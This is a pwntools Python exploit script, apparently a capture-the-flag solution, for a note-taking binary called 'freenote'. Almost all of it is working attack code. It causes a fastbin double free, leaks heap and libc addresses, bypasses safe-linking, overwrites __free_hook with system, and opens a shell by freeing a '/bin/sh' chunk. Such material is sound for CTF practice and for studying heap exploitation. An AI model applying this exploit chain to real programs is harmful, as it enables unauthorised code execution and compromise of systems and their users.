#!/usr/bin/python3
from pwn import *

HOST, PORT = "localhost", 5006

elf = ELF("../dist/freenote")
if args.REMOTE:
    libc = ELF("../dist/libc-2.32.so")
else:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def protect_ptr(heap_leak, ptr):
    return ptr ^ (heap_leak >> 12)


def create_note(index, size, content):
    p.sendlineafter(b">>> ", b"1")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    if content:
        p.sendlineafter(b"Content: ", content)


def show_note(index):
    p.sendlineafter(b">>> ", b"2")
    p.sendlineafter(b"Index: ", str(index).encode())
    return p.recvline()


def free_note(index):
    p.sendlineafter(b">>> ", b"3")
    p.sendlineafter(b"Index: ", str(index).encode())


def exploit():
    global p

    if args.REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process(elf.path)

    ###
    ### Phase 1: get a libc leak
    ###

    # fill up the tcache (7 entries)
    for i in range(9):
        create_note(i, 0xF, b"A")

    for i in range(7):
        free_note(i)

    # free note 7, then 8, then 7 again to cause a double free
    # these will be stored in a fastbin
    free_note(7)
    free_note(8)
    free_note(7)

    # consume the tcache so the later chunks would be serviced from the fastbin
    for i in range(7):
        create_note(i, 0xF, b"A")

    # get heap leak
    heap_leak = u64(show_note(7)[:-1].ljust(8, b"\x00"))
    p.info(f"Got heap leak {heap_leak:#x}")

    if heap_leak >> 24:
        return False

    ptr = protect_ptr(heap_leak, elf.got.stdout)
    create_note(7, 0xF, p64(ptr))
    create_note(8, 0xF, b"A")
    create_note(9, 0xF, b"A")
    create_note(10, 0, b"")  # this will overlap with the got section

    libc_leak = u64(show_note(10)[:-1].ljust(8, b"\x00"))
    libc.address = ((libc_leak - libc.sym.stdout) & ~0xFFF) + 0x1000
    p.success(f"stdout @ {libc_leak:#x}")
    p.success(f"libc base @ {libc.address:#x}")
    p.success(f"__free_hook @ {libc.sym.__free_hook:#x}")
    p.success(f"system @ {libc.sym.system:#x}")

    ###
    ### Phase 2: overwrite __free_hook with system
    ###

    # fill up the tcache (7 entries)
    for i in range(9):
        create_note(i, 0x1F, b"A")

    for i in range(7):
        free_note(i)

    # free note 7, then 8, then 7 again to cause a double free
    free_note(7)
    free_note(8)
    free_note(7)

    # Consume the tcache
    for i in range(7):
        create_note(i, 0x1F, b"A")

    ptr = protect_ptr(heap_leak, libc.sym.__free_hook)
    create_note(7, 0x1F, p64(ptr))
    create_note(8, 0x1F, b"A")
    create_note(9, 0x1F, b"/bin/sh\x00")
    create_note(10, 0x1F, p64(libc.sym.system))  # this will overlap with __free_hook

    free_note(9)

    p.interactive()

    return True


if __name__ == "__main__":
    while not exploit():
        pass
